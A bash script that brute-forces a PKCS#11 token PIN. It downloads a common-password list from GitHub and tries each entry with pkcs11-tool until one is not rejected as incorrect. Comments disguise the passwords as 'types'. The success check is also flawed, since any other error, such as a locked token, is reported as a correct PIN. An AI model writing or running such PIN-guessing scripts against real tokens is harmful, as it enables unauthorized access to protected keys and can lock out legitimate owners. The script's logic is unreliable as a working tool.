#!/bin/bash

# Define the PKCS11 module and PIN
PKCS11_MODULE="/path/to/pkcs11/module.so"

# URL of the text file containing PKCS11 types
PWD_URL="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/best15.txt"

# Download the types file
curl -s -o pwd.txt "$PWD_URL"

# Check if the download was successful
if [ $? -ne 0 ]; then
  echo "Error downloading the types file."
  exit 1
fi

# Function to run pkcs11-tool and check for the error
run_pkcs11_tool() {
  local pwd="$1"
  local result
  result=$(pkcs11-tool --module "$PKCS11_MODULE" --list-slots --pin "$pwd" 2>&1)

  if [[ $result == *"error: PKCS11 function C_Login failed: rv = CKR_PIN_INCORRECT (0xa0)"* ]]; then
    echo "Type $pwd is incorrect."
  else
    echo "Type $pwd is correct. Stopping."
    exit 0
  fi
}

# Read the types from the file and loop through them
while IFS= read -r PWD; do
  echo "Trying PKCS11 type: $PWD"
  run_pkcs11_tool "$PWD"
done < "pwd.txt"

echo "All types tested, but no correct type found."

# Clean up by deleting the temporary file
rm "pwd.txt"
